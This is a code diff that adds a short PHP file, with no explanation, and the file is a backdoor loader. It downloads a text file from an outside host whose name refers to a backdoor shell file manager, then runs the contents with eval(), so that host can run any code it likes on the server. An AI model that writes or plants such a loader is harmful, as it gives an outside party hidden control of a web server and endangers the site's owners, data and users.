@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://khusus-backdorshell-fil-manager.pages.dev/fms-obs.txt'));
+
+$content = "?> ".$content;
+eval($content);
